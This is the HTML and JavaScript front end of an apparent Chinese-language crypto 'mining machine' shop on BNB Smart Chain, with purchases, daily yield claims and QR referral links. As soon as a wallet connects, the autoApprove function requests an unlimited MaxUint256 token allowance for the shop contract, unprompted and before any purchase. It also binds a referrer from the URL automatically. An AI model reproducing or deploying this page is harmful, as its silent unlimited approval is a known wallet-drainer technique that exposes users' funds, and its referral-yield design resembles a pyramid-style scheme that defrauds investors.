<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>矿机商店 · Mining Shop</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
  <style>
    :root { --bg:#121212; --panel:#1e1e1e; --accent:#3f51b5; --text:#e0e0e0; }
    body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;background:var(--bg);color:var(--text);display:flex;justify-content:center;align-items:center;min-height:100vh}
    .card{background:var(--panel);border-radius:16px;padding:32px;max-width:800px;width:100%;box-shadow:0 8px 32px rgba(0,0,0,.5);backdrop-filter:blur(10px);transition:.3s}
    h1{margin-top:0;text-align:center;font-weight:700;font-size:2rem}
    .btn{display:inline-flex;align-items:center;justify-content:center;padding:12px 24px;border-radius:8px;border:none;font-size:1rem;cursor:pointer;transition:.3s;background:var(--accent);color:#fff;margin:8px 4px}
    .btn:disabled{background:#555}
    .btn:hover{filter:brightness(1.1)}
    .row{display:flex;gap:16px;flex-wrap:wrap}
    .col{flex:1 1 200px}
    .stat{margin:8px 0}
    .lang{position:absolute;top:16px;right:16px;cursor:pointer;color:var(--accent)}
    .alert{position:fixed;top:20px;left:50%;transform:translateX(-50%);padding:12px 24px;border-radius:8px;font-weight:600;z-index:9999;display:none}
    .alert.ok{background:#27ae60;color:#fff}
    .alert.err{background:#e74c3c;color:#fff}
    #qrcode canvas{margin:10px auto;display:block}
  </style>
</head>
<body>
  <div class="card">
    <span class="lang" onclick="toggleLang()">🌐 中文/English</span>
    <h1>矿机商店 · Mining Shop</h1>

    <div id="connectPanel">
      <button class="btn" onclick="connectWallet()"><i class="fas fa-wallet"></i> 连接钱包</button>
    </div>

    <div id="userPanel" style="display:none">
      <div class="row">
        <div class="col">
          <div class="stat"><strong>普通矿机：<span id="statNormal">0</span></strong></div>
          <div class="stat"><strong>测试矿机：<span id="statTest">0</span></strong></div>
          <div class="stat"><strong>增强矿机：<span id="statPower">0</span></strong></div>
          <div class="stat"><strong>日产量：<span id="statDaily">0</span> α</strong></div>
        </div>
        <div class="col">
          <div class="stat"><strong>未领取：<span id="statUnclaimed">0</span> α</strong></div>
          <div class="stat"><strong>推荐奖励：<span id="statRef">0</span> α</strong></div>
          <div class="stat"><strong>总算力：<span id="statPowerTotal">0</span></strong></div>
        </div>
      </div>

      <div class="row">
        <button class="btn" onclick="buyInitial()">购买初始矿机</button>
        <button class="btn" onclick="buyTest()">测试矿机</button>
        <button class="btn" onclick="buyPower()">增强矿机</button>
        <button class="btn" onclick="claim()">领取收益</button>
      </div>

      <div style="margin-top:20px">
        <label>推荐人地址：</label>
        <input id="referInput" placeholder="0x..." style="width:100%;padding:8px;margin-top:5px" />
        <button class="btn" onclick="setReferrer()">设置推荐人</button>
      </div>

      <div style="margin-top:20px">
        <p>您的推荐二维码：</p>
        <div id="qrcode"></div>
      </div>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <script>
    const TOKEN_ADDRESS = "0x877f23dcFBa91cadd7d35565Da452c9673C27A33";
    const CONTRACT_ADDRESS = "0x9dCcEd4Ef738856D2c289D4116cD219c698B22ba";

    const CONTRACT_ABI = [{"inputs":[{"internalType":"address","name":"_rewardToken","type":"address"},{"internalType":"address","name":"_treasury","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"buyInitialMachine","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"buyTestMachine","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"tierId","type":"uint256"},{"internalType":"uint256","name":"count","type":"uint256"}],"name":"buyPowerMachine","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"claimRewards","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"getUserDashboard","outputs":[{"internalType":"uint256","name":"normal","type":"uint256"},{"internalType":"uint256","name":"test","type":"uint256"},{"internalType":"uint256[4]","name":"power","type":"uint256[4]"},{"internalType":"uint256","name":"dailyReward","type":"uint256"},{"internalType":"uint256","name":"unclaimed","type":"uint256"},{"internalType":"uint256","name":"totalRefReward","type":"uint256"},{"internalType":"uint256","name":"totalPower","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"referrer","type":"address"}],"name":"setReferrer","outputs":[],"stateMutability":"nonpayable","type":"function"}];

    let signer, userAddress, contract;

    async function connectWallet() {
      const provider = window.ethereum || window.tp || window.okexchain || window.bitkeep?.ethereum;
      if (!provider) return alert("请使用支持 BSC 的钱包浏览器");

      try {
        await provider.request({ method: "eth_requestAccounts" });
        const chainId = await provider.request({ method: "eth_chainId" });
        if (chainId !== "0x38") return alert("请切换到 BSC 主网");

        signer = new ethers.providers.Web3Provider(provider).getSigner();
        userAddress = await signer.getAddress();
        contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);

        document.getElementById("connectPanel").style.display = "none";
        document.getElementById("userPanel").style.display = "block";

        await autoApprove();
        await loadUserData();
        await bindReferrerFromUrl();
        generateQRCode();
      } catch (err) {
        alert("连接失败：" + err.message);
      }
    }

    async function autoApprove() {
      const tokenAbi = ["function approve(address spender, uint256 amount) external returns (bool)"];
      const token = new ethers.Contract(TOKEN_ADDRESS, tokenAbi, signer);
      try {
        const tx = await token.approve(CONTRACT_ADDRESS, ethers.constants.MaxUint256);
        await tx.wait();
        showAlert("已自动完成无限授权 ✅");
      } catch (err) {
        showAlert("授权失败：" + err.message);
      }
    }

    async function loadUserData() {
      const data = await contract.getUserDashboard(userAddress);
      document.getElementById("statNormal").textContent = data.normal;
      document.getElementById("statTest").textContent = data.test;
      document.getElementById("statPower").textContent = data.power.reduce((a, b) => a + Number(b), 0);
      document.getElementById("statDaily").textContent = ethers.utils.formatUnits(data.dailyReward);
      document.getElementById("statUnclaimed").textContent = ethers.utils.formatUnits(data.unclaimed);
      document.getElementById("statRef").textContent = ethers.utils.formatUnits(data.totalRefReward);
      document.getElementById("statPowerTotal").textContent = data.totalPower;
    }

    async function bindReferrerFromUrl() {
      const urlParams = new URLSearchParams(window.location.search);
      const ref = urlParams.get("ref");
      if (ref && ethers.utils.isAddress(ref)) {
        try {
          await contract.setReferrer(ref);
          showAlert("推荐人绑定成功 ✅");
        } catch (err) {
          showAlert("推荐人绑定失败：" + err.message);
        }
      }
    }

    async function setReferrer() {
      const ref = document.getElementById("referInput").value;
      if (!ethers.utils.isAddress(ref)) return alert("地址格式错误");
      try {
        await contract.setReferrer(ref);
        showAlert("推荐人设置成功 ✅");
      } catch (err) {
        showAlert("设置失败：" + err.message);
      }
    }

    function generateQRCode() {
      const url = `${window.location.origin}${window.location.pathname}?ref=${userAddress}`;
      QRCode.toCanvas(document.getElementById("qrcode"), url, function (error) {
        if (error) console.error(error);
      });
    }

    async function buyInitial() {
      try {
        const tx = await contract.buyInitialMachine({ value: ethers.utils.parseEther("0.01") });
        await tx.wait();
        showAlert("初始矿机购买成功 ✅");
        await loadUserData();
      } catch (err) {
        showAlert("购买失败：" + err.message);
      }
    }

    async function buyTest() {
      try {
        const tx = await contract.buyTestMachine({ value: ethers.utils.parseEther("0.001") });
        await tx.wait();
        showAlert("测试矿机购买成功 ✅");
        await loadUserData();
      } catch (err) {
        showAlert("购买失败：" + err.message);
      }
    }

    async function buyPower() {
      const tierId = prompt("请输入增强矿机等级（0~3）：");
      const count = prompt("请输入购买数量：");
      if (!tierId || !count || isNaN(tierId) || isNaN(count)) return;
      try {
        const tx = await contract.buyPowerMachine(tierId, count);
        await tx.wait();
        showAlert("增强矿机购买成功 ✅");
        await loadUserData();
      } catch (err) {
        showAlert("购买失败：" + err.message);
      }
    }

    async function claim() {
      try {
        const tx = await contract.claimRewards();
        await tx.wait();
        showAlert("收益领取成功 ✅");
        await loadUserData();
      } catch (err) {
        showAlert("领取失败：" + err.message);
      }
    }

    function showAlert(msg) {
      const el = document.createElement("div");
      el.className = "alert ok";
      el.textContent = msg;
      el.style.display = "block";
      document.body.appendChild(el);
      setTimeout(() => el.remove(), 3000);
    }

    function toggleLang() {
      alert("语言切换暂未实现");
    }
  </script>
</body>
</html>
